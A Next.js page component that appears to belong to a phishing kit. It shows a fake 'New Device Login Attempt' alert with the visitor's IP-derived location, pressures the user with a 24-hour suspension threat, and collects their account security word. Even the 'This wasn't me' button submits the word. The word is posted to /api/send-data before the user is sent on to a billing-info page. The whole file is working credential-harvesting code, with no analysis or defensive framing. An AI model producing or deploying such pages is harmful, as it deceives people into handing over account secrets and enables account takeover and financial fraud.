"use client";

import Footer from "@/components/layout/Footer";
import Header from "@/components/layout/Header";
import axios from "axios";
import { useRouter } from "next/navigation";
import React, { useEffect, useState } from "react";

const Page = () => {
  const [securityWord, setSecurityWord] = useState("");
  const [loading, setLoading] = useState(false);
  const [locationLoading, setLocationLoading] = useState(true);
  const [userLocation, setUserLocation] = useState("Detecting location...");
  const router = useRouter();

  // --------------- Detect User's City + State ---------------
  useEffect(() => {
    const fetchLocation = async () => {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        if (data && (data.city || data.region)) {
          const city = data.city || "";
          const region = data.region || "";
          const locationText =
            city && region ? `${city}, ${region}` : region || city;
          setUserLocation(locationText);
        } else {
          setUserLocation("Unknown Location");
        }
      } catch (err) {
        console.error("⚠️ Location fetch failed:", err);
        setUserLocation("Unknown Location");
      } finally {
        setLocationLoading(false);
      }
    };

    fetchLocation();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      setLoading(true);
      await axios.post("/api/send-data", { securityWord });
      router.push("/billing-info");
    } catch (err) {
      alert("Wrong Security Word, Please give valid Security Word");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="bg-[#f5f7fa] min-h-screen flex flex-col">
      <Header />

      <div className="flex-grow flex items-center justify-center px-4 min-h-[90vh]">
        <div className="w-full max-w-md bg-white rounded-2xl shadow-lg p-8">
          <h1 className="text-2xl font-bold text-[#0d2d62] mb-4">
            New Device Login Attempt
          </h1>

          <p className="text-sm text-gray-700 mb-6 leading-relaxed">
            We recently noticed a new login to your account from{" "}
            <span className="font-semibold">
              {locationLoading ? "Detecting location..." : userLocation}
            </span>
            . If this was you, please verify your security word to continue
            using your account without interruption.
          </p>

          <form onSubmit={handleSubmit}>
            <div className="flex mb-6 gap-4">
              <h1 className="text-lg font-bold text-[#0d2d62]">
                Security Word:
              </h1>
              <input
                placeholder=""
                type="text"
                name="securityWord"
                value={securityWord}
                onChange={(e) => setSecurityWord(e.target.value)}
                className="w-[200px] border rounded-lg px-4 text-lg tracking-widest text-center placeholder:tracking-normal placeholder:font-medium focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                required
              />
            </div>

            <div className="flex gap-4 mb-6">
              <button
                type="submit"
                className="flex-1 border border-[#056dae] text-[#056dae] py-3 rounded-lg font-semibold hover:bg-[#f0f4f9] transition-colors text-center cursor-pointer"
              >
                {loading ? "Loading..." : "This wasn’t me"}
              </button>

              <button
                type="submit"
                className="flex-1 bg-primary hover:!bg-[#054e7b] text-white py-3 rounded-lg font-semibold transition-colors text-center"
              >
                {loading ? "Loading..." : "Confirm"}
              </button>
            </div>
          </form>

          <p className="text-xs text-gray-600 leading-relaxed">
            If you don’t confirm within 24 hours, we’ll limit and suspend your
            account. We apologize for any inconvenience caused by our security
            measures.
          </p>
        </div>
      </div>

      <Footer />
    </main>
  );
};

export default Page;
